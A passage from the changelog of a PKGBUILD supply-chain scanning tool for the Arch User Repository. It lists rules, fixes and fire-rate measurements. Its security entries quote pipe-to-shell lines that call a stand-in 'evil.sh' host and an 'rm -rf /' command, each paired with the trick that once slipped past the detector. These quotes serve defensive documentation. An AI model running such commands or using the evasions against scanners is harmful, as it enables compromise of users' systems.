  literal `curl https://… | bash` that R001 owns, instead of staying an
  opaque `$C` the literal-matching rules step over.
- **The synthetic fixtures now validate under the shipped config before
  writing.** `scripts/gen_malicious_fixtures.py` resolves labels against the
  same cold-DB, `shipped_config()` context `scan_malicious` runs in, so a
  rule that stops detecting fails at generation time, and a fixture whose
  label was hand-reconciled (R004/R009/R025/R026/R027/R039/R059/R128/R129/R130)
  can no longer be silently clobbered by a regenerate.

### Fixed

- **`depends+=` was invisible to the dependency rules.** Accumulated
  dependency declarations were never parsed as declarations, so a recipe
  that appended to `depends` cold showed no finding at all. The generator
  now keeps `evasion-depends-via-plus-eq` filed as an open gap (novelty
  rules are DB-backed and silent under the gates' cold DB) rather than
  pretending the parse gap is closed.

## [0.11.0] - 2026-07-30

### Added

- **`inspect` output redesigned.** Single Panel with "Rules Triggered" header, Score/Risk at bottom, `--score`/`--risk` independent flags.
- **`review` `--risk` flag.** Coloured border by risk level and Risk row.
- **Dedicated "Files changed" section** in both review and inspect, showing each file with `+`/`~`/`-` prefix.
- **`override wizard <package>`** command. Interactive rule suppression per package.
- **R081 (foreign package manager in install hooks) and R082 (shell obfuscation density ≥3 patterns) graduated from experimental** to enabled by default. Zero false positives on a 3243-diff benign corpus.

### Changed

- **`src/trustsight/analysis.py` (1080 lines) refactored** into `analysis/` package: `base.py`, `build.py`, `dependencies.py`, `maintainer.py`, `pipeline.py`, `structural.py`, `temporal.py`.
- **`src/trustsight/cli.py` (2035 lines) refactored** into `cli/` package: `admin.py`, `app.py`, `display.py`, `forget.py`, `history.py`, `inspect.py`, `list_cmd.py`, `review.py`.
- **`python-cryptography` promoted** from optdepends to hard dependency (resolves namcap warnings about uninstalled `cryptography` module at runtime).
- **`packaging/aur/README.md`** corrected: `python-tldextract` is in the `extra` repository, not the AUR.

### Fixed

- **`fetch_metadata(on_progress=...)` signature mismatch.** The `review` command passed an `on_progress` callback to `fetch_metadata()` but the function did not accept it, crashing with `TypeError` when the metadata-dump download path was taken. Added the `on_progress` parameter to `fetch_metadata()`.
- **Nested parameter expansions** in PKGBUILD variables now resolve correctly via brace-depth tracking.
- **`__seed__` sentinel** excluded from user-facing database queries. Unanalyzed packages show `-` instead of stale seed-derived scores.
- **Version display** contract enforced: `None` shows as `-`, unresolvable strings as `"unresolved"`, across all CLI output paths.
- **Conftest fixture conflict** resolved.

## [0.10.0] - 2026-07-29

### Added

- **Regression tests** for metadata-dispatch bugs (first-run sentinel, repo
  warnings in metadata path, cross-referencing repos, deduplication).
  7 new tests in `tests/test_cli.py`.
- **`optdepends`** for `python-cryptography` and `pyalpm` in
  `packaging/aur/PKGBUILD`.
- **Line mapping for findings.** `map_diff_lines()` maps diff line indices to
  file names and line numbers.  Findings from `apply_rules()` now carry
  `file`/`line` context propagated through `ScoreEntry` and `PackageFact`.
- **Per-file change tracking.** `DiffSummary.file_changes` lists every changed
  file with its status (`added`/`removed`/`modified`), excluding `.SRCINFO`
  and `.gitignore`.
- **Corpus analysis adapter.** `analyze_package_text()` analyzes raw old/new
  PKGBUILD text via `difflib.unified_diff`, enabling the full-AUR corpus
  pipeline (no git repository required).

### Changed

- **`get_installed_from_repo()`** rewired from `pacman -Q --repo` (which
  missed packages not tracked as repo-origin) to `pacman -Sl <repo>` +
  `pacman -Q`.  The old approach only found packages whose `pacman -Q` shows
  an explicit repository name; the new one lists the repo's contents via
  `-Sl` and cross-references with `-Q`.
- **Discovery for `review`** replaced AUR RPC calls with the local
  metadata-dump snapshot (`full-aur-meta.json`, from `full_aur/metadata.py`).
  Installed versions are compared against snapshot versions via `vercmp`
  instead of per-package AUR RPC `info` queries. Falls back to the RPC on
  failure.
- **Repo warnings** split into two distinct messages: `repo 'X' does not
  exist` (when `pacman -Sl` fails) and `repo 'X' exists but no packages from
  it are installed` (when the repo exists but `-Q` finds nothing).
- **`_get_installed_packages()`** now correctly cross-references repo
  packages and foreign packages, respecting `--repo`, `--foreign`, and
  `--all-repos` flags.  Previous implementation only collected foreign
  packages when a repo was specified.
- **First-run sentinel.** `_discover_packages()` returns `(None, 0)` on the
  first metadata fetch so that `review()` does not emit a duplicate
  "No outdated packages found" message.
- **Python >=3.11 required.** `requires-python` bumped from `>=3.10` to
  `>=3.11`. The `tomli` compat shim (`src/trustsight/_toml.py`) and its
  conditional dependency in `pyproject.toml` are removed. All imports use
  stdlib `tomllib`.
- **CI matrix** drops Python 3.10.


### Fixed

- **All 3 namcap warnings** resolved by removing the `tomli` dependency and
  adding `optdepends`.

### Removed

- **`watch` command.** Removed in favour of running `trustsight baseline
  build` via cron. The `baseline build` command already handles incremental
  updates (diff + process changed) when a prior metadata snapshot exists.
  Use `--json` for machine-parseable cron output.
- **`src/trustsight/_toml.py`** removed along with the `tomli` fallback for
  Python 3.10.

## [0.10.1] - 2026-07-29

### Added

- **`forget` command.** `trustsight forget <package>...` removes packages from
  the local database. Supports `--prune` (remove packages not in the AUR),
  `--dry-run` (preview without deleting), and `--yes` (skip confirmation).
  Cascading deletes across 7 database tables. Documented in
  `docs/reference/cli.md`.
- **AUR verification on `inspect`.** The `inspect` command now verifies a
  package exists in the AUR before analysis, with graceful fallback to cached
  local data when the AUR RPC is unreachable.

### Fixed

- **Nested parameter expansion in PKGBUILD variables.** The resolver now
  handles constructs like `${srcdir}/${pkgname}-${pkgver}` by recursively
  expanding nested variable references. `resolve_expansions()` and supporting
  helpers (`_expand_one()`, `_glob_to_regex()`, `_strip_affix()`) added to
  `tokenizer.py`. 20 regression tests.
- **`__seed__` sentinel leaking into listings.** The synthetic `__seed__`
  package (used for first-run detection) no longer appears in `list` output
  or other user-facing queries. `get_package_id()` and `get_package()`
  return `None` for reserved names; `upsert_package()` raises `ValueError`.
- **Unanalyzed packages showing `0/100 Low`.** The `inspect` and `review`
  commands now display `-` for score and risk when a package has
  not yet been analyzed, instead of misleading `0/100 Low`.
- **Empty version strings shown as `unresolved`.** Version strings that do
  not match the plausible-version regex (e.g. unresolved PKGBUILD variables)
  display as `unresolved` in all output paths.

### Changed

- **Test fixture import resolution.** `tests/conftest.py` inserts `src/` into
  `sys.path` so that pytest can resolve `trustsight` imports without relying
  on the installed package.

## [0.9.0] - 2026-07-28

### Removed

- **LLM integration.** `src/trustsight/llm.py` deleted; verdicts are now
  entirely deterministic using rule-specific templates in `verdict.py`.
  `openai>=1.0` and `[project.optional-dependencies] ollama` removed from
  `pyproject.toml`. The `--simple` flag on `review`/`inspect`, the `config
  setup` command, the `[llm]` config section, and the `TRUSTSIGHT_API_KEY` /
  `TRUSTSIGHT_BASE_URL` environment variables are all removed.

### Changed

- **Verdicts now deterministic.** Each rule description includes its rule ID
  in brackets, e.g. `"maintainer changed to 'bob' [R071]"`. The
  `fallback_verdict()` function renders from a `_TEMPLATES` registry keyed by
  `rule_id`, falling back to `entry.reason` if no template exists.

- **FATAL verdict punctuation.** The second sentence now begins with a capital
  letter for readability.

- **Packaging.** LLM optdepends (`python-openai`, `ollama`) removed from
  `packaging/aur/PKGBUILD` and `.SRCINFO`.

### Fixed

- **All 12+ documentation files** swept of LLM references. `--verbose` added
  to the commands table in `README.md`.

## [0.8.0] - 2026-07-27

### Added

- **Full-AUR corpus builder.** `trustsight baseline build` fetches the AUR
  metadata archive, downloads PKGBUILDs via cgit with snapshot tarball
  fallback, runs the full analysis pipeline, and persists results. Progress
  is saved every 1000 packages for `--resume`. `trustsight baseline import`
  merges a signed corpus artifact into the local database. `trustsight watch`
  polls the AUR metadata on a configurable interval and analyses only the
  changed packages, optionally firing alert hooks.

- **Property stability tracking.** Eleven per-package, per-key property
  dimensions are recorded on every analysis with a SHA-256 value hash and
  a `stable_for_n` counter (accumulates on identical observations, resets on
  change). Feeds longitudinal rules R094-R102.

- **Canonical reproducible serialisation.** `canonical_artifact_bytes()`
  produces byte-identical output from the same corpus inputs. The signed
  payload records the ruleset version, scorer version, and corpus cutoff
  in a deterministic manifest.

- **ed25519 artifact signing.** `build_artifact` accepts `--sign KEY`.
  `import_baseline()` verifies against the shipped public key and refuses
  unsigned artifacts by default (`--allow-unsigned` for local builds).

- **`config setup` interactive wizard.** Walks through provider choice
  (openai, ollama), endpoint, API key (masked), model name, and connection
  test.

- **`--simple` flag** on `review` and `inspect` to skip the LLM verdict.

- **First-run welcome banner.** Shown on first `review` when the novelty
  seed is imported, printing config path, database path, and next-step
  suggestions.

- **`config set` extended.** `model`, `timeout`, and `provider` keys now
  accepted alongside `api_key` and `base_url`.

### Changed

- **TemporalContext unifies both analysis paths.** The git-based and
  corpus-based paths share a single `TemporalContext` parameter that declares
  the clock source (`git_commit`, `aur_metadata`, `observation_history`)
  rather than deriving timestamps internally. The clock source is recorded on
  every `PackageFact` as `temporal_source`.

- **`history` suggests `inspect` for unanalysed packages.** Instead of
  `"not found in history"`, now says `"Run 'trustsight inspect X' first."`

### Fixed

- **LLM verdict always used in `inspect`.** Previously called
  `fallback_verdict()` unconditionally instead of `generate_verdict()`.
- **API exceptions and suppressed verdicts now logged at `warning` level.**
  Previously `debug` made them invisible.

## [0.7.2] - 2026-07-27

### Added

- **New CLI commands.** `trustsight list` lists all packages tracked in the
  database with their latest score, risk, version, and maintainer.
  `trustsight status` shows database health statistics (packages tracked,
  total analyses, effective observations, dependency corpus status).

- **Database maintenance commands.** `trustsight db check` runs `PRAGMA
  integrity_check`. `trustsight db vacuum` reclaims disk space from deleted
  rows. `trustsight db backup` creates a safe online backup via
  `sqlite3.backup()` without stopping the application.

- **AUR RPC response cache.** A new `aur_cache` table stores AUR version
  lookups so repeated reviews do not re-query the AUR server. Config key
  `[discovery] cache_ttl_minutes` controls freshness (default: 60 minutes;
  set to 0 to disable).

- **`inspect --verbose` flag.** Threaded through to both the rich and plain
  output paths. In JSON mode it includes the score breakdown in the output.

- **`PRAGMA busy_timeout=5000`.** The database connection now retries locked
  writes for 5 seconds instead of raising `OperationalError: database is locked`
  immediately.

### Changed

- **Pipelined analysis and LLM verdicts.** The batch-review path replaced its
  serial analysis loop with a `ThreadPoolExecutor` where each task runs
  `analyze_package()` followed immediately by `_verdict_for()` in the same
  thread. Analysis and LLM calls now overlap across workers instead of running
  strictly sequentially, reducing wall time by roughly
  `min(total_analysis, total_llm)` seconds.

- **AUR RPC queries are cached.** `get_aur_package_info()` checks the local
  cache before making HTTP requests; only packages not in cache (or whose
  cache entry has expired) reach the AUR server.

### Fixed

- **`_run_analysis_loop()` output indentation.** The rich-table and plain-text
  output branches were nested inside `if json_output:` (after its `return`),
  making them dead code. Restructured into a clean three-way branch.

## [0.7.1] - 2026-07-27

### Added

- **Database schema migration for `current_maintainer`.** A migration step
  (`_migrate` + `_ADDED_COLUMNS`) now safely adds columns that were introduced
  after the initial schema shipped. Existing databases created before
  `current_maintainer` existed will have it added on the first run, fixing a
  crash on upgrade.

- **Concurrent prefetch of AUR repositories.** The batch-review path clones or
  fetches all package repos in parallel before beginning analysis, so the
  network latency of 20 sequential fetches no longer dominates the runtime.

- **AUR RPC helpers.** `get_aur_package_info` and `get_aur_latest_versions`
  batch-query the AUR RPC interface, replacing individual per-package lookups
  and reducing network round-trips.

- **Drift detection for shipped rules.** `drifted_shipped_rules()` compares the
  on-disk `rules.toml` against the shipped template, flagging when a rule
  definition has drifted from the canonical copy.

- **`diff_truncated` field on `PackageFact`.** Marks analyses where the diff
  was truncated, so the report can indicate the change was only partially
  examined.

- **`_prefetch` uniqueness invariant.** An assertion guarantees that
  `_prefetch` receives unique package names, preventing redundant parallel
  clones.

- **Test fixtures shared via `conftest.py`.** `SHARED_RULES` (R001-R013) and
  `SHARED_CONFIG` (five top-level keys) are now defined once and imported by
  `test_analysis.py`, `test_rules.py`, `test_scenarios.py`, and
  `test_scoring.py`, removing 173 lines of duplication across four test files.

### Fixed

- **IDN homograph false positive.** `has_homograph()` no longer flags
  single-script labels containing non-ASCII Latin letters or combining marks.
  Only mixed-script labels are confusables per UTS #39 Highly Restrictive.
  Legitimate IDNs like `münchen.de` and `café.fr` are no longer reported.
  The `_latin_with_combining_marks()` helper was removed entirely.

- **PKGBUILD `check()` function.** Now builds a venv with
  `--system-site-packages`, installs the built wheel, and runs pytest
  (excluding `test_fetcher.py` and `test_rebaseline.py`). The previous bare
  `python -m pytest` call failed against an uninstalled source tree.

### Changed

- **Thread-local connection caching.** Database connections are cached per
  thread and per database path rather than opened per query. The hot paths
  issue thousands of small reads; opening a connection once instead of per
  query reduces overhead from ~0.35ms to effectively zero on repeat use.

- **`_is_current` uses HEAD commit time as fallback.** When no marker file
  exists (clones from earlier versions), the local HEAD commit time is compared
  against `upstream_mtime`. This eliminates a redundant `git fetch` for every
  package whose clone is already up to date, cutting the batch-review wall
  clock from ~2min to ~3s for a 19-package run.

- **`_ensure_init` runs init once per process.** `ensure_default_configs()` and
  `init_db()` are now called at most once per process via a module-level guard.
  Previously they ran on every `analyze_package()` call, adding ~100-200ms per
  package.

- **R066 (`_package_is_new`) capped at 100 commits.** The brand-new-package
  check previously walked the entire DAG to find the root commit. Packages with
  more than 100 commits are now skipped (they are definitionally not new),
  eliminating full-history walks that cost ~30-50s for packages with thousands
  of commits.

- **Lazy `__version__` loading.** The version string is now loaded via PEP 562
  `__getattr__` instead of `importlib.metadata.version()` at import time,
  avoiding a 46ms penalty on every `import trustsight`.

- **Pattern cache in `rules.py`.** Compiled regex patterns are cached across
  diffs, avoiding repeated `re.compile` calls that dominated the diff-analysis
  hot path.

- **Typosquat detection uses `top_dependency_pairs()`.** The rank-and-compare
  loop now fetches name-count pairs in a single query instead of running one
  query per candidate, fixing a performance regression on large databases.

### Removed

- **Dead code and duplicate patterns.** `parse_srcinfo_with_pkgbase` (uncalled)
  and several unreachable lines in `srcinfo.py` were removed.
  `_PINNING_ORDER` was unified in `buckets.py`; `risk_level()` is now the
  single source of truth across all callers.

- **`.seo-debug/` tracked artifacts.** Documentation JSON files committed by a
  prior zensical run are removed from the index and gitignored.

### Style

- **Ruff E402 violations resolved.** `log = logging.getLogger(__name__)` was
  moved below all imports in `analysis.py` and `llm.py`. Exception handlers in
  `override.py` were narrowed from `except BaseException` to `except Exception`.

### Documentation

- **Docstrings added to all 124 functions** across 19 source files, covering
  every public and private function including inner closures.

### Build

- **`.gitignore` updated for makepkg artifacts.** `packaging/aur/pkg/`,
  `packaging/aur/src/`, `*.tar.gz`, and `*.pkg.tar.*` are now ignored.

## [0.7.0] - 2026-07-26

### Added

- **Temporal context rules (R065-R067).** Three new code-emitted rules that
  inspect git commit timestamps on the AUR repository rather than diff content.
  All are on by default with no config toggle.

  | Rule | Name | Severity | Condition |
  |------|------|----------|-----------|
  | R065 | Very Recent Update | INFO (w 0) | HEAD commit < 72 h old |
  | R066 | Brand New Package | INFO (w 0) | First AUR commit < 30 days old |
  | R067 | Stale Package Revived | MEDIUM (w 15) | Gap to last analyzed commit > 365 days |

- **Install, build, and maintainer rules (R068-R073).** Six new code-emitted
  rules that inspect install hooks, GPG verification removal, build environment
  subversion, maintainer takeovers, capability density, and release cadence.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R068 | Install Hook Present | INFO (w 0) | context | PKGBUILD declares install= or diff touches *.install |
  | R069 | GPG Verification Removed | HIGH (w 25) | integrity | validpgpkeys populated before, empty/absent after |
  | R070 | Build Environment Subversion | HIGH/MEDIUM (w 25/15) | build | LD_PRELOAD/LD_LIBRARY_PATH (HIGH) or CFLAGS/LDFLAGS/MAKEFLAGS/PATH (MED) set inside build fn |
  | R071 | Untrusted Maintainer Takeover | HIGH (w 25) | maintainer | maintainer changed + new maintainer globally novel |
  | R072 | Capability Density Anomaly | INFO (w 0) | meta | rule hits span 3+ distinct categories |
  | R073 | Accelerated Release Cadence | metadata (never scored) | temporal-metadata | HEAD has 3+ ancestors in the last 24 h |

  All R068-R073 are always on, gated only by diff content or database
  maturity rather than an experimental flag.

- **Naming and dependency-set rules (R074-R075).** Two new code-emitted rules
  that detect package-name typosquatting and aggregate dependency-set expansion.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R074 | Package-Name Typosquat | HIGH (w 25) | naming | name within edit-distance 2 of a far-more-popular package, not a variant |
  | R075 | Dependency-Set Expansion | MEDIUM (w 15) | dependency | diff adds 3+ deps whose count x mean-rarity exceeds gate |

  Both are always on, gated only by a cold-start maturity check.
  R074 uses seed popularity data and requires a warmed database;
  R075 is fully corpus-calibratable.

- **Fire rates measured for R068-R075.** Measured against the 3246-diff
  benign corpus. R068 (20.95 %), R069 (0.03 %), R070 (0.25 %), R072 (15.87 %),
  R074 (1.12 % package-scan), R075 (0.34 %). All scored rules pass the 30 %
  gate. R071/R073 require live git history and are marked TBD in fire-rates.md.

### Fixed

- **Crash bugs in the analysis pipeline and CLI.** Seven fixes that prevented
  the tool from crashing on unusual package states or missing dependencies:

  | ID | Issue | Fix |
  |----|-------|-----|
  | B1 | `pygit2.GitError` raised `NameError` at runtime because pygit2 was not imported in `analysis.py` | Added `import pygit2` (not just a type stub) |
  | B2 | `generate_diff` crashes on stale commit OIDs that produce `None` commits | Guard against `None` before accessing `.tree` |
  | B3 | `get_head_commit` propagates `GitError` for empty/unborn repos | Wrapped in try/except, returns `""` on failure |
  | B4 | One bad package in a batch aborts the entire scan | Per-package try/except around `analyze_package` in CLI loop |
  | B5 | Tool crashes on startup when `rich` is not installed | Guard `console()` and all fallback paths with `HAS_RICH` checks |
  | B6 | Seed-import message leaks into JSON stdout with `--json` | Pass `quiet=True` to `maybe_auto_import_seed` in JSON mode |
  | B10 | `_simple_vercmp` compares version parts lexicographically (e.g. `9` > `10`) | Parse as integers before comparison |

- **`python -m trustsight` support.** Added `src/trustsight/__main__.py` so the
  tool works with `python -m trustsight` in addition to the installed script.

## [0.6.1] - 2026-07-25

### Changed

- **Eight experimental rules promoted to enabled by default.** D001, D002, D003,
  D004, R061, R062, R063, and R064 now default to `true` in both the config
  template and the code fallback.  Users who already have an
  `[experimental_rules]` section in their `config.toml` are unaffected and keep
  their existing setting; users without the section pick up the new defaults
  automatically.

  Fire rates (false-positive rates on the 3246-diff benign corpus) that
  justified the promotion:

  | Rule | Severity | Rate | Fires |
  |------|----------|------|-------|
  | D001 | HIGH | 0.15 % | 5/3246 |
  | D002 | HIGH | 0.00 % | 0/3246 |
  | D003 | MEDIUM | 0.46 % | 15/3246 |
  | D004 | HIGH | 0.00 % | 0/3246 |
  | R061 | HIGH | 0.22 % | 7/3246 |
  | R062 | HIGH | 0.09 % | 3/3246 |
  | R063 | HIGH | 0.00 % | 0/3246 |
  | R064 | MEDIUM | 0.03 % | 1/3246 |

  See [Fire Rates](explanation/fire-rates.md) for the full reference.

- **Baseline regenerated** with the new defaults.  The eight rules now appear
  in per-stratum fire-rate records.  Aggregate metrics (`zero_pct`, `p95`)
  shifted slightly as expected; the baseline is the new reference.

### Added

- **Fire Rates documentation page** (`docs/explanation/fire-rates.md`).
  Explains how fire rates are measured, the two corpora, the 30 % demotion
  gate, and per-rule tables for core, expanded, D-series, and build-function
  rules.

### Added

- **Four more supply-chain rules**, all off by default, each measured against the 3246-diff benign corpus before being designed. **D004 0.00 %, R062 0.09 %, R063 0.00 %, R064 0.03 %.**
    - **D004 (HIGH)** `provides`/`replaces` claims an established package unrelated to this one, installing it in front of the real thing. Variants (`htop-vim` → `htop`) and siblings (`linux-cachyos` → `linux-headers`) are suppressed, but a shared *ecosystem* prefix is not: `python-evil` claiming `python-requests` still fires, because thousands of unrelated packages share `python-`. "Established" is `pacman -Slq`, falling back to `observation_count`.
    - **R062 (HIGH)** a `.install` hook that fetches or performs a privileged operation. Hooks run as root at install time. Needed no new parsing: `generate_diff()` already includes `*.install` patches and `_classify_enclosing_function()` recognises `post_install()` like any other function.
    - **R063 (HIGH)** a patch applied from a URL, an absolute path, or process substitution.
    - **R064 (MEDIUM)** a `source=` URL downgraded from `https` to `http`. `extract_source_array_urls()` gained a `side` parameter so both sides of the diff can be compared.
- **D-series dependency-graph rules**, closing part of the documented build-dependency blind spot. All are **off by default** under a new `[experimental_rules]` config section, so `baseline.json` is unaffected until they are deliberately enabled.
    - **D001 (HIGH)** novel dependency: a name never observed anywhere in the AUR. Backed by a new `dependency_names` table seeded from every dependency entry **plus every package name and `provides` alias**, without which a real package that nothing else depends on would read as novel. Silent on an unseeded database rather than flagging everything.
    - **D002 (HIGH)** typosquatted dependency, e.g. `openss1` for `openssl`. Refines D001 and is reported in its place.
    - **D003 (MEDIUM)** `makedepends` gains a network-capable tool, so the build can fetch code no checksum covers.
- **R060 is now INFO (weight 0) and on by default.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also edits `build()`" case it was proposed for is 9.8 %. At weight 0 it reports context to a reviewer without touching any score.
- **R061 (HIGH)** a download inside a build function whose URL is absent from `source=()`. Off by default.
- `scripts/generate_seed.py` records dependency names from the `.SRCINFO` it already reads, so seeding costs no extra I/O. `normalize_dependency` is shared with the runtime lookup: were the two to normalise differently, every query would miss and every dependency would look novel.
- `tokenizer.resolve_added_lines()` returns resolved lines with positions intact, so a rule can still resolve variables *and* know its enclosing function. Resolution alone discards that.
- The bundled seed is regenerated and now carries **209,909 dependency names** alongside 179,956 URLs and 35,903 maintainers. `seed.db.gz` grows from 13.0 MB to 19.9 MB.

  Fire rates against the 3246-diff benign corpus, so these are false-positive rates: **D001 0.15 %, D002 0.00 %, D003 0.46 %, D004 0.00 %, R061 0.22 %, R062 0.09 %, R063 0.00 %, R064 0.03 %, R060 21.4 %**. R060 is the outlier by design, marking any edit to a build function; at weight 5 it cannot reclassify a package alone but it moves benign p95 more than the other four together, so it deserves a separate decision from the rest.

### Fixed

- **`_EXPERIMENTAL_DEFAULTS` in `analysis.py`.** `load_config()` reads the user's `config.toml` verbatim and never merges new defaults in, so an existing install would never have seen `[experimental_rules]` and R060 would have been dead for every upgrade. Defaults now live in code, with the config file overriding them.
- **D004 did nothing when enabled on its own.** It shared a guard clause that only tested D001-D003, so the whole dependency block returned early unless one of those was also on. Covered by a test that enables each rule in isolation.
- **The dependency extractor read shell code as dependency names.** An unbounded fallback for unquoted array entries pulled `if`, `[[`, and `!` out of a `package()` body, and comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`). Together these put D001 at 5.95 % against a true rate of 0.15 %. Array termination is now quote-aware and bounded, tokens are validated against the Arch package-name grammar, and comments are stripped.
- **`resolve_added_lines()` shifted every line after an assignment.** It zipped its output against `tokenize_and_resolve()`, which omits assignment lines, so any added assignment made the two sequences different lengths. An array header could vanish and a rule scoped to `build()` could be handed the wrong function. Substitution is now applied per line from a shared variable table, which `tokenize_and_resolve()` also uses so the two cannot diverge.
- **The release workflow could not commit its result.** The `Commit to the default branch` step failed with `fatal: not in a git directory`, despite `actions/checkout` having run `git init` in the workspace normally. Rather than fight the container's git, the workflow is now split: `makepkg` work (checksum, `--verifysource`, `--printsrcinfo`) runs in the Arch container and hands `PKGBUILD` and `.SRCINFO` over as an artifact, and a second job on the standard runner does the commit. `include-hidden-files` is set on the upload, since `.SRCINFO` is a dotfile and would otherwise be silently dropped. A `concurrency` group stops two releases racing on the same branch.
- **`packaging/aur/PKGBUILD` carried the wrong checksum.** Because the release workflow never completed, `pkgver` had been bumped to 0.5.1 while `sha256sums` still held the v0.5.0 tarball's hash, so `makepkg -si` failed validation for anyone following the documented install. Corrected to the real v0.5.1 hash and verified with `makepkg --verifysource`; `.SRCINFO` regenerated to match.

## [0.5.1] - 2026-07-25

### Added

- `.github/workflows/release-pkgbuild.yml`: on a `v*` tag, downloads the generated source tarball, computes its sha256, and writes `pkgver`, `pkgrel`, and `sha256sums` into `packaging/aur/PKGBUILD` on the default branch, regenerating `.SRCINFO` with `makepkg --printsrcinfo`. The PKGBUILD shipped to users therefore never carries `SKIP`. The checksum is validated with `makepkg --verifysource` before the commit, so a wrong hash fails the release rather than reaching a user.

  The update lands on the default branch and the tag is never moved. GitHub generates the tarball from the tree the tag points at, so amending the tag would change the tarball and invalidate the checksum just computed.

### Fixed

- `packaging/aur/.SRCINFO` was stale: it declared `pkgver = 0.3.0`, an all-zero `sha256sums`, and omitted the `python-typer` dependency the PKGBUILD requires. Regenerated, and now kept current automatically by the release workflow.

## [0.5.0] - 2026-07-25

### Added

- `scripts/build_corpus.py --from-manifest`: rebuilds the exact corpus recorded in `corpus.lock` instead of re-selecting packages by AUR popularity. Fetches only the branches named in the lock into an empty bare repo, so reconstruction takes minutes rather than requiring a full clone of the AUR monorepo. This is what lets CI materialise the corpus, which is gitignored and therefore never present on a fresh checkout.

### Security

- **A message prefix disabled every scoped rule.** Any line starting with `echo`/`printf`/`msg`/ followed by a quote was classified as an inert "message" in its entirety, but a shell line does not end at its first command. `echo "x"; sudo rm -rf /` scored 0 where `sudo rm -rf /` scored 40, so a seven-character prefix switched off R009 (CRITICAL), R010, and R011. Message context now requires the line to contain no command separator (`;`, `&`, `|`) or substitution (`$(`, backtick).
- **Line continuations bypassed the CRITICAL pipe-to-shell rules.** Rules match one line at a time, so splitting `curl http://evil.sh | bash` across a trailing backslash left R001/R002 with only a `curl \` fragment, dropping the score from 65 to 25. Continuations are now joined into one logical line before matching, for both the raw and resolved paths.
- **Variable resolution never ran inside function bodies.** The tokenizer's assignment pattern was anchored at `^(\w+)=`, so any indented assignment (that is, every assignment inside a function) was skipped and the variable table stayed empty. `C=curl` followed by `$C http://evil.sh | bash` resolved to nothing and defeated every rule matching resolved strings, scoring 20 against a baseline of 65. Assignments are now recognised when indented and when introduced by `local`/`export`/`declare`/`readonly`/`typeset`.
- **One-line function bodies escaped function scoping.** `package() { curl evil | bash; }` was classified before the depth counter advanced, so the line read as `other` and `function_body`-scoped rules skipped it; the counter was also left raised for everything that followed.
- **`..` passed package-name validation and could delete the cache root.** `_VALID_PKG_NAME` accepted `.` and `..`, so `repo_path("..")` resolved to the parent of the repo cache, which `clone_or_fetch` then passed to `shutil.rmtree` when it failed to open as a repository. Both names are now rejected, and `repo_path` additionally asserts the resolved path is directly inside the cache root.
- `discovery.fetch_package_info` interpolated the package name straight into the RPC query string; an unescaped `&` or `#` could inject or truncate parameters. It now uses `urlencode`, matching `get_aur_latest_versions`.

### Fixed

- **Mirror Integrity Check never ran.** The `Alert on failure` step's script block was mis-indented, making `mirror-check.yml` unparseable; every run failed during workflow startup. The workflow now also reconstructs the corpus before verifying it, rather than assuming a directory that cannot exist in CI.
- **Corpus Drift Detection failed with `Corpus not found`** for the same reason, and now rebuilds the corpus from the lock first (caching the fetched AUR objects).
- **Corpus diffs were not reproducible across machines.** `git` scales the abbreviation length in `index <old>..<new>` lines to a repository's object count, so a sparse clone emitted 7-character hashes where the full mirror emitted 12: byte-different diffs for identical commits, invalidating `corpus_content_sha256`. `core.abbrev` is now pinned to 12 and recorded in the lock.
- **Overlapping strata double-counted diffs.** A package matching two strata (`python-foo-git` matches both `lang_ecosystem` and `vcs_git`) was walked once per stratum, and both entries were kept, inflating per-stratum fire rates. Entries are now deduplicated at lock-write time, keeping the last stratum to match the overwrite order the corpus on disk already had. `corpus.lock` drops from 3332 to 3246 entries with no change to the corpus itself.
- `corpus.lock` recorded `strata_file` as an absolute path from the generating machine.
- Drift reports are no longer passed through a `GITHUB_OUTPUT` heredoc, whose delimiter could be forged by diff content and whose payload could exceed the 1 MB output limit. Both workflows also suppress duplicate issues instead of filing one per run.

### Documentation

- `re-baselining.md` described behaviour `rebaseline.py` does not have: it does not check out the corpus, does not validate CI gates, and reports no `p5`/`p50`. Strata are package shapes, not `benign`/`malicious`/`synthetic`. Corrected, and the required corpus-reconstruction step added.
- `writing-a-rule.md` referenced a `--check-fire-rate` flag that does not exist, and the wrong corpus path.
- Installation is now documented as a single path: `git clone` from GitHub plus `makepkg -si` against the in-repo PKGBUILD. The pipx and `pip` routes have been removed, and the docs note that the package is not yet published to the AUR.
- `rules.md` documented a bare function header as the only header behaviour, and did not mention that continuations are joined before matching. Both corrected, along with the qualification that `message` context requires the line to be only a message.
- `cli.md` listed `scope-contradiction` as an error; it is now a warning.

## [0.4.1] - 2026-07-25

### Added

- `--json` flag on all commands for machine-readable output.
- PKGBUILD build+install CI workflow using `archlinux:latest` container.
- AUR install instructions in README and getting-started guide.

### Changed

- CLI migrated from `argparse` to `typer`: auto-generated `--help`, type-annotated callbacks, `--json` flag per command. Entry point renamed from `main` to `app`.
- CLI tests updated from `patch(sys.argv)` pattern to `typer.testing.CliRunner`.
- Documentation tests parse typer patterns (`add_typer`, `@command`) instead of argparse `add_parser`.

### Fixed

- Mirror-check CI now triggers on `push` for corpus.lock and benign-corpus changes.

## [0.4.0] - 2026-07-25

### Added

- Multi-repo and foreign package discovery: new `--repo`, `--foreign`, `--all-repos` flags for `trustsight review`. Packages can be scanned from specific local repositories, all auto-detected local repos (excluding official ones), and/or foreign packages. Config-driven defaults via new `[discovery]` section in `config.toml`.
- `vercmp`-based version comparison for accurate detection of outdated packages (replaces string inequality).
- Graceful fallback to string comparison when `vercmp` binary is missing.

### Changed

- Python requirement lowered from `>=3.12` to `>=3.10`. `tomllib` usage replaced with a `tomli` fallback shim for 3.10 compatibility.
- CI matrix expanded to test Python 3.10 through 3.14.
- Catastrophic backtracking detection threshold raised (`_BACKTRACK_REPS` 18 -> 22) to remain effective on Python 3.12+ optimized regex engine.

## [0.3.1] - 2026-07-24

### Fixed

- Verdict text no longer printed to stdout during `review` for every package (stray `print(result)` in `generate_verdict_stream` non-streaming path)
- Stale `~/.pyenv/shims/trustsight` shadowed pipx install, causing `trustsight -v` to report 0.1.0 instead of the actual installed version

### Added

- `-v` / `--version` CLI flags via `importlib.metadata.version()`
